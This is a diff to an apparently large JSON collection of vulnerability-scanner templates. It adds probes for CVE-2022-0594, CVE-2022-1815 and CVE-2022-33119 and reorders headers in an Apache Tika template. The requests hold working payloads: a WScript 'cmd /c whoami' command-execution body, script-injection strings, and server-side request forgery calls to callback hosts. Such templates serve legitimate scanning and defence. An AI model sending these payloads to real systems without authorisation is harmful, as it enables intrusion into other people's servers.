@@ -6418,11 +6418,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -18140,6 +18140,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0594",
+      "info": {
+        "name": "Shareaholic < 9.7.6 - Information Disclosure",
+        "severity": "low"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=shareaholic_debug_info"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0595",
       "info": {
         "name": "Drag and Drop Multiple File Upload - Contact Form 7 < 1.3.6.3 - Unauthenticated Stored XSS",
@@ -18483,6 +18498,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-admin/admin-ajax.php?action=swpm_validate_email&fieldId=%22%3Cscript%3Ealert(document.domain)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1815",
+      "info": {
+        "name": "Drawio < 18.1.2 - Server Side Request Forgery",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /service/0/test.oast.me HTTP/2\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -19630,6 +19659,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/loginsave.php?u=http://interact.sh"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-33119",
+      "info": {
+        "name": "NVRsolo v03.06.02 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: \"><script>alert(document.domain)</script><\"\n\nlanguage=en&user=user&pass=pass&submit=Login\n"
           ]
         }
       ]
